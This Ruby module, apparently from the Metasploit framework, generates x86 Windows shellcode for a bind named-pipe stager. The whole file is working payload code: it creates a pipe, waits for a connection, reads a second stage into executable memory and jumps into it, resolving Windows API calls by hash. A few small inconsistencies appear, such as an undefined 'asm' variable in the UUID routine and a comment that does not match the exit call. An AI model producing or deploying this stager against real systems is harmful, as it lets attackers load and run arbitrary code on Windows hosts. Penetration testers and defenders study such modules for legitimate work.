# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/windows/send_uuid'
require 'msf/core/payload/windows/block_api'
require 'msf/core/payload/windows/exitfunk'

module Msf

###
#
# bind_named_pipe payload generation for Windows ARCH_X86
#
###
module Payload::Windows::BindNamedPipe

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows
  include Msf::Payload::Windows::SendUUID
  include Msf::Payload::Windows::BlockApi
  include Msf::Payload::Windows::Exitfunk

  #
  # Register bind_named_pipe specific options
  #
  def initialize(*args)
    super
    register_advanced_options(
      [
        OptInt.new('WAIT_TIMEOUT', [false, 'Seconds pipe will wait for a connection', 10])
      ]
    )
  end

  #
  # Generate the first stage
  #
  def generate
    conf = {
      name:        datastore['PIPENAME'],
      host:        datastore['PIPEHOST'],
      timeout:     datastore['WAIT_TIMEOUT'],
      reliable:    false,
    }

    # Generate the advanced stager if we have space
    unless self.available_space.nil? || required_space > self.available_space
      conf[:reliable] = true
      conf[:exitfunk] = datastore['EXITFUNC']
    end

    generate_bind_named_pipe(conf)
  end

  #
  # By default, we don't want to send the UUID, but we'll send
  # for certain payloads if requested.
  #
  def include_send_uuid
    false
  end

  #
  # Generate and compile the stager
  #
  def generate_bind_named_pipe(opts={})
    combined_asm = %Q^
      cld                     ; Clear the direction flag.
      call start              ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop ebp               ; block API pointer
      #{asm_bind_named_pipe(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
  end

  def transport_config(opts={})
    transport_config_bind_named_pipe(opts)
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
    space += 31

    # Reliability adds bytes! +56 if exitfunk, otherwise +90
    #space += 56
    space += 90

    space += uuid_required_size if include_send_uuid

    # The final estimated size
    space
  end

  def uuid_required_size
    # TODO update this
    space = 0

    # UUID size
    space += 16
  end

  #
  # hPipe must be in edi. eax will contain WriteFile return value
  # 
  def asm_send_uuid(uuid=nil)
    uuid ||= generate_payload_uuid
    uuid_raw = uuid.to_raw

    asm << %Q^
      send_uuid:
        push 0                     ; lpNumberOfBytesWritten
        push esp
        push #{uuid_raw.length}    ; nNumberOfBytesToWrite
        call get_uuid_address      ; put uuid buffer on the stack
        db #{raw_to_db(uuid_raw)}  ; lpBuffer
      get_uuid_address:
        push edi                   : hPipe
        push #{Rex::Text.block_api_hash('kernel32.dll', 'WriteFile')}
        call ebp                   ; WriteFile(hPipe, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten)
    ^
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [String]  :exitfunk The exit method to use if there is an error, one of process, thread, or seh
  # @option opts [Bool]    :reliable Whether or not to enable error handling code
  # @option opts [String]  :name Pipe name to create
  # @option opts [Int]     :timeout Seconds to wait for pipe connection
  #
  def asm_bind_named_pipe(opts={})

    reliable       = opts[:reliable]
    timeout        = opts[:timeout] * 1000 # convert to millisecs
    retry_wait     = 500
    retry_count    = timeout / retry_wait
    full_pipe_name = "\\\\\\\\.\\\\pipe\\\\#{opts[:name]}"  # double escape -> \\.\pipe\name
    chunk_size     = 0x10000    # pipe buffer size
    cleanup_funk   = reliable ? 'cleanup_file' : 'failure'
    pipe_mode      = 1          # (PIPE_TYPE_BYTE|PIPE_NOWAIT|PIPE_READMODE_BYTE)

    asm = %Q^
      create_named_pipe:
        push 0                  ; lpSecurityAttributes. Default r/w for creator and administrators
        push 0                  ; nDefaultTimeOut
        push #{chunk_size}      ; nInBufferSize
        push #{chunk_size}      ; nOutBufferSize
        push 255                ; nMaxInstances (PIPE_UNLIMITED_INSTANCES). in case pipe isn't released
        push #{pipe_mode}       ; dwPipeMode 
        push 3                  ; dwOpenMode (PIPE_ACCESS_DUPLEX)
        call get_pipe_name      ; lpName
        db "#{full_pipe_name}", 0x00
      get_pipe_name:
        push #{Rex::Text.block_api_hash('kernel32.dll', 'CreateNamedPipeA')}
        call ebp                ; CreateNamedPipeA(lpName, dwOpenMode, dwPipeMode, nMaxInstances, nOutBufferSize,
                                ;                  nInBufferSize, nDefaultTimeOut, lpSecurityAttributes)
        mov edi, eax            ; save hPipe (using sockedi convention)

      ; check for failure
        cmp eax, -1             ; did it work? (INVALID_HANDLE_VALUE)
        jz failure

      ; initialize retry counter
        push #{retry_count}     ; retry counter
        pop esi

      ; Connect pipe to remote
      connect_pipe:
        push 0                  ; lpOverlapped
        push edi                ; hPipe
        push #{Rex::Text.block_api_hash('kernel32.dll', 'ConnectNamedPipe')}
        call ebp                ; ConnectNamedPipe(hPipe, lpOverlapped)

      ; check for failure
        push #{Rex::Text.block_api_hash('kernel32.dll', 'GetLastError')}
        call ebp                ; GetLastError()
        cmp eax, 0x217          ; looking for ERROR_PIPE_CONNECTED
        jz get_stage_size       ; success
        dec esi
        jz #{cleanup_funk}      ; out of retries

      ; wait before trying again
        push #{retry_wait}
        push #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}
        call ebp                ; Sleep(millisecs)
        jmp connect_pipe
      ^

    asm << asm_send_uuid if include_send_uuid

    asm << 'get_stage_size:'

    # For reliability, set pipe state to wait so ReadFile blocks
    if reliable
      asm << %Q^
        push 0
        mov ecx, esp
        push 0                  ; lpCollectDataTimeout
        push 0                  ; lpMaxCollectionCount
        push ecx                ; lpMode (PIPE_WAIT)
        push edi                ; hPipe
        push #{Rex::Text.block_api_hash('kernel32.dll', 'SetNamedPipeHandleState')}
        call ebp                ; SetNamedPipeHandleState(hPipe, lpMode, lpMaxCollectionCount, lpCollectDataTimeout)
      ^
    end

    asm << %Q^
      ; read size of second stage
        sub esp, 8
        push 0                  ; lpOverlapped
        lea ebx, [esp+4]        ; lpNumberOfBytesRead
        push ebx
        push 4                  ; nNumberOfBytesToRead
        lea ecx, [esp+16]       ; lpBuffer
        push ecx
        push edi                ; hPipe
        push #{Rex::Text.block_api_hash('kernel32.dll', 'ReadFile')}
        call ebp                ; ReadFile(hPipe, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped)
        pop eax                 ; lpNumberOfBytesRead
        pop esi                 ; lpBuffer (stage size)
      ^

    if reliable
      asm << %Q^
      ; check for bytesRead == 4
        cmp eax, 4              ; expecting 4 bytes
        jnz cleanup_file
      ^
    end

    asm << %Q^
      get_second_stage:
      ; Alloc a RWX buffer for the second stage
        push 0x40               ; PAGE_EXECUTE_READWRITE
        push 0x1000             ; MEM_COMMIT
        push esi                ; dwLength
        push 0                  ; NULL as we dont care where the allocation is
        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
        call ebp                ; VirtualAlloc(NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
      ^

    if reliable
      asm << %Q^
        test eax, eax           ; VirtualAlloc returning 0 is an error
        jz cleanup_file
      ^
    end

    asm << %Q^
        push eax                ; save stage base address
        mov ebx, eax            ; stage 2 buff ptr

      read_more:
        ; prepare the size min(0x10000, esi)
        mov edx, #{chunk_size}
        cmp edx, esi
        jle read_max            ; read chunk_size
        mov edx, esi            ; read remaining bytes
      read_max:
        push 0
        mov ecx, esp
        push 0                  ; lpOverlapped
        push ecx                ; lpNumberOfBytesRead
        push edx                ; nNumberOfBytesToRead
        push ebx                ; lpBuffer
        push edi                ; hPipe
        push #{Rex::Text.block_api_hash('kernel32.dll', 'ReadFile')}
        call ebp                ; ReadFile(hPipe, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped)
        pop edx                 ; lpNumberOfBytesRead
    ^

    if reliable
      asm << %Q^
      ; check to see if the read worked
        test eax, eax
        jnz read_successful

      ; something failed so free up memory
        pop ecx
        push 0x8000             ; MEM_RELEASE
        push 0                  ; dwSize, 0 to decommit whole block
        push ecx                ; lpAddress
        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualFree')}
        call ebp                ; VirtualFree(payload, 0, MEM_RELEASE)

      cleanup_file:
      ; cleanup the pipe handle
        push edi                ; file handle
        push #{Rex::Text.block_api_hash('kernel32.dll', 'CloseHandle')}
        call ebp                ; CloseHandle(hPipe)

        jmp failure
      ^
    end

    asm << %Q^
      read_successful:
        add ebx, edx            ; buffer += bytes_received
        sub esi, edx            ; length -= bytes_received
        test esi, esi           ; check for 0 bytes left
        jnz read_more           ; continue if we have more to read

        pop ecx
        jmp ecx                 ; jump into the second stage
    ^

    asm << 'failure:'

    if opts[:exitfunk]
      asm << %Q^
        call exitfunk
      ^
      asm << asm_exitfunk(opts)
    elsif reliable
      asm << %Q^
        call get_kernel32_name
        db "kernel32", 0x00
      get_kernel32_name:
        push #{Rex::Text.block_api_hash('kernel32.dll', 'GetModuleHandleA')}
        call ebp                ; GetModuleHandleA("kernel32")

        call get_exit_name
        db "ExitThread", 0x00
      get_exit_name:            ; lpProcName
        push eax                ; hModule
        push #{Rex::Text.block_api_hash('kernel32.dll', 'GetProcAddress')}
        call ebp                ; GetProcAddress(hModule, "ExitThread")
        push 0                  ; dwExitCode
        call eax                ; ExitProcess(0)
      ^
    else
      # run off the end
    end

    asm
  end

end

end
